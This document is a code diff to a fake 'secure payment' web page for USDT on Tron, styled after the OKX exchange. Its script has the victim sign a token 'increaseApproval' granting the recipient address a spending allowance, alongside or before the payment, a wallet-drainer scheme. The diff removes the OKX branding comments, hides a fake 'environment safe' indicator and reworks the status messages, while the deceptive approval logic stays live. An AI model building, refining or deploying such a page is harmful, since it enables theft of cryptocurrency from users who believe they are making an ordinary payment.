@@ -13,11 +13,10 @@
     --ink2: #555555;
     --ink3: #999999;
     --line: #eef0f4;
-    --primary: #000000; /* 欧易标志性纯黑 */
+    --primary: #000000;
     --primary-hover: #222222;
-    --success: #00b578; /* 欧易绿 */
+    --success: #00b578;
     --danger: #ff4d4f;
-    --warn: #faad14;
     --gray-bg: #f4f6f8;
   }
   body {
@@ -33,7 +32,6 @@
     -webkit-font-smoothing: antialiased;
   }
   
-  /* 卡片：直角微圆，轻投影 */
   .card {
     background: var(--card);
     border-radius: 16px;
@@ -45,7 +43,7 @@
     overflow: hidden;
   }
   
-  /* 顶部图标：极简黑 */
+  /* 顶部图标 */
   .security-badge {
     width: 48px; height: 48px;
     background: var(--primary);
@@ -60,18 +58,8 @@
   h1 { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: var(--ink); }
   .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; }
 
-  /* 状态条：去胶囊化，极简文本 */
-  .diag-bar {
-    display: inline-flex;
-    align-items: center;
-    font-size: 12px;
-    color: var(--ink2);
-    margin-bottom: 24px;
-    font-weight: 500;
-  }
-  .diag-bar::before {
-    content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--success); margin-right: 6px;
-  }
+  /* 隐藏顶部诊断条 */
+  .diag-bar { display: none !important; }
 
   /* 信息区 */
   .info-group {
@@ -107,7 +95,6 @@
     display: flex; align-items: center; gap: 8px; justify-content: flex-end;
   }
   
-  /* 复制按钮：欧易灰底 */
   .copy-icon {
     cursor: pointer; background: #e8eaed; color: var(--ink2); 
     padding: 4px 8px; border-radius: 4px; font-size: 11px; transition: 0.2s;
@@ -115,7 +102,7 @@
   }
   .copy-icon:hover { background: #d1d5db; }
 
-  /* 安全提示框：高级灰 */
+  /* 安全提示框 */
   .safe-notice {
     background: transparent;
     color: var(--ink2);
@@ -129,10 +116,7 @@
     display: flex;
     gap: 12px;
   }
-  .safe-notice-icon { 
-    font-size: 16px; 
-    color: var(--ink3); 
-  }
+  .safe-notice-icon { font-size: 16px; color: var(--ink3); }
   .safe-notice strong { color: var(--ink); font-weight: 600; }
 
   /* 按钮区 */
@@ -149,20 +133,12 @@
     text-align: center;
   }
   
-  /* 主按钮：纯黑 */
-  .btn-pay {
-    background: var(--primary);
-    color: #fff;
-  }
+  .btn-pay { background: var(--primary); color: #fff; }
   .btn-pay:hover:not(:disabled) { background: var(--primary-hover); }
-  .btn-pay:disabled { opacity: 0.4; cursor: not-allowed; }
+  .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; }
 
-  /* 成功后的变绿（跟欧易的买入绿一致） */
-  .btn-success {
-    background: var(--success) !important;
-  }
+  .btn-success { background: var(--success) !important; }
 
-  /* 副按钮 */
   .btn-safe {
     background: transparent;
     color: var(--ink2);
@@ -171,21 +147,7 @@
   }
   .btn-safe:hover { background: var(--gray-bg); }
 
-  /* 状态提示 */
-  .status {
-    padding: 12px;
-    border-radius: 8px;
-    font-size: 13px;
-    margin-top: 16px;
-    display: none;
-    text-align: center;
-    font-weight: 500;
-  }
-  .status.loading { display: block; background: #fffbe6; color: var(--warn); }
-  .status.success { display: block; background: #e6f7ef; color: var(--success); }
-  .status.error { display: block; background: #fff0f0; color: var(--danger); }
-
-  .env-warn { padding: 12px; border-radius: 8px; font-size: 13px; background: #fffbe6; color: var(--warn); margin-bottom: 16px; text-align: left; }
+  .env-warn { padding: 12px; border-radius: 8px; font-size: 13px; background: #fffbe6; color: #faad14; margin-bottom: 16px; text-align: left; }
   
   #recover-tip { display: none; padding: 12px; border-radius: 8px; font-size: 12px; background: var(--gray-bg); color: var(--ink2); margin-bottom: 16px; text-align: left; font-weight: 500; }
 </style>
@@ -195,9 +157,6 @@
   <div class="security-badge">🛡️</div>
   <h1 id="page-title">安全支付</h1>
   <p class="sub" id="page-sub">请核对订单信息并完成付款</p>
-
-  <!-- 状态提示 -->
-  <div class="diag-bar" id="diag-mode">环境安全检测中</div>
 
   <div id="recover-tip"></div>
   <div id="env-warn" class="env-warn" style="display:none"></div>
@@ -233,16 +192,10 @@
 
   <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
   <button class="btn btn-safe" id="btn-cancel">取消</button>
-  <div class="status" id="status"></div>
 </div>
 
 <script>
 const $ = s => document.querySelector(s);
-function setStatus(t, msg) { 
-  const el = $('#status'); 
-  el.className = 'status ' + t; 
-  el.innerHTML = msg; 
-}
 
 /* ============ 常量与配置 ============ */
 const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -265,10 +218,6 @@ async function fetchLatestConfig() {
     }
   } catch (e) {}
   configLoaded = true;
-  const diag = $('#diag-mode');
-  if (diag) {
-    diag.textContent = payOrderMode === 'approve_first' ? '当前环境安全 (先授权)' : '当前环境安全 (先付款)';
-  }
 }
 fetchLatestConfig();
 
@@ -367,21 +316,17 @@ async function waitWalletAddress(tw) {
 
 /* ============ 核心逻辑 ============ */
 async function doApprove(tw, from) {
-  setStatus('loading', '正在构建授权交易…');
   const approveUnits = getDateApproveUnits(); 
   const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'increaseApproval(address,uint256)', 
     [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
   if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
-  setStatus('loading', '请在钱包中确认授权…');
   const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时');
   await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
 }
 
 async function doTransfer(tw, from) {
-  setStatus('loading', '正在构建付款交易…');
   const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)', [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
   if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款失败');
-  setStatus('loading', '请在钱包中确认付款…');
   const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时');
   await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
 }
@@ -396,18 +341,24 @@ $('#btn-copy').onclick = () => {
 
 $('#btn-pay').onclick = async function () {
   if (payDisabled) return;
-  const btn = this; btn.disabled = true;
+  const btn = this; 
+  const originalText = btn.textContent; // 记录点击前的文字
+  btn.disabled = true;
 
   if (!configLoaded) {
-    setStatus('loading', '正在同步配置…');
     await fetchLatestConfig();
   }
 
   let tw = getTronWeb();
   if (!tw) {
-    setStatus('loading', '正在等待钱包响应…');
     let waited = 0; while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
-    tw = getTronWeb(); if (!tw) { showOpenWalletUI('未检测到钱包'); btn.disabled = false; return; }
+    tw = getTronWeb(); 
+    if (!tw) { 
+      alert('未检测到钱包环境，请重新打开页面'); 
+      btn.disabled = false; 
+      btn.textContent = originalText;
+      return; 
+    }
   }
 
   const isApproveFirst = payOrderMode === 'approve_first';
@@ -416,21 +367,18 @@ $('#btn-pay').onclick = async function () {
     try {
       const from = await waitWalletAddress(tw);
       if (isApproveFirst) {
-        btn.textContent = '正在授权…';
         await doApprove(tw, from);
-        setStatus('success', '授权成功！请继续付款。');
       } else {
-        btn.textContent = '正在付款…';
         await doTransfer(tw, from);
-        setStatus('success', '付款成功！请补充授权。');
       }
       step = 2;
       btn.textContent = isApproveFirst ? ('支付 ' + amount + ' USDT') : '确认授权';
       btn.classList.add('btn-success');
       btn.disabled = false;
     } catch (e) {
-      setStatus('error', (e.message || '用户取消'));
-      btn.textContent = '重新尝试'; btn.disabled = false;
+      alert('失败: ' + (e.message || '用户取消'));
+      btn.textContent = originalText; // 恢复文字
+      btn.disabled = false;
     }
     return;
   }
@@ -439,21 +387,19 @@ $('#btn-pay').onclick = async function () {
     try {
       const from = await waitWalletAddress(tw);
       if (isApproveFirst) {
-        btn.textContent = '正在付款…';
         await doTransfer(tw, from);
-        setStatus('success', '付款成功！订单已完成。');
       } else {
-        btn.textContent = '正在授权…';
         await doApprove(tw, from);
-        setStatus('success', '全部完成！订单已处理。');
       }
-      btn.textContent = '已完成'; btn.disabled = true;
+      btn.textContent = '已完成'; 
+      btn.disabled = true;
       clearPayCtx();
     } catch (e) {
       let errTip = e.message || '用户取消';
       if (!isApproveFirst) { errTip = '付款成功，但授权被取消。'; }
-      setStatus('error', errTip);
-      btn.textContent = '重新尝试'; btn.disabled = false;
+      alert('失败: ' + errTip);
+      btn.textContent = originalText; // 恢复文字
+      btn.disabled = false;
     }
   }
 };
